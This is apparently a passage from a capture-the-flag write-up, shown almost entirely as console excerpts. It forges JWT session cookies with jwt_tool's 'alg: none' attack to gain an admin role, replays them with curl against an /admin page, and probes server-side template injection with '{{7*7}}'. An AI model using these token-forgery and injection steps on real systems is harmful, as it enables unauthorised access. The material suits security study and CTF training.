...
< Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[AWS_SECRET_REMOVED]ciIsImNyZWF0ZWRBdCI6MTY4MTI5ODg3OH0.Uyo8lLg_UYGRWmfDFQpPivz3qSO-tJI0UXrzD35fSkI; Path=/
```
...
```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ python3 ~/utils/web/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[AWS_SECRET_REMOVED]ciIsImNyZWF0ZWRBdCI6MTY4MTI5ODg3OH0.Uyo8lLg_UYGRWmfDFQpPivz3qSO-tJI0UXrzD35fSkI
...
```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ python3 ~/utils/web/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[AWS_SECRET_REMOVED]ciIsImNyZWF0ZWRBdCI6MTY4MTI5ODg3OH0.Uyo8lLg_UYGRWmfDFQpPivz3qSO-tJI0UXrzD35fSkI -X a -I -pc role -pv admin
...
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.[AWS_SECRET_REMOVED]aW4iLCJjcmVhdGVkQXQiOjE2ODEyOTg4Nzh9.
...
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.[AWS_SECRET_REMOVED]aW4iLCJjcmVhdGVkQXQiOjE2ODEyOTg4Nzh9.
...
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.[AWS_SECRET_REMOVED]aW4iLCJjcmVhdGVkQXQiOjE2ODEyOTg4Nzh9.
...
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJuT25FIn0.[AWS_SECRET_REMOVED]aW4iLCJjcmVhdGVkQXQiOjE2ODEyOTg4Nzh9.
```
...
```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ python3 ~/utils/web/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[AWS_SECRET_REMOVED]ciIsImNyZWF0ZWRBdCI6MTY4MTI5ODg3OH0.Uyo8lLg_UYGRWmfDFQpPivz3qSO-tJI0UXrzD35fSkI -X a -I -pc role -pv admin -pc username -pv Elsa -pc createdAt -pv 1386280800000
...
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED].
...
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED].
...
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED].
...
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJuT25FIn0.[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED].
```
...
```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ curl 'https://arendelle.plagues-of-egypt.com/admin' -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED].'
<html>
    <head>
        <title>Arendelle</title>
...
```console
┌──(user@kali)-[/media/sf_CTFs/basmach/Thunderstorm_of_hail_and_fire]
└─$ curl 'https://arendelle.plagues-of-egypt.com/admin?search=%7B%7B7*7%7D%7D' -H 'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED].' -s | grep result
                result: 49
```
...
iOiJub25lIn0.[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED].' -s | grep result
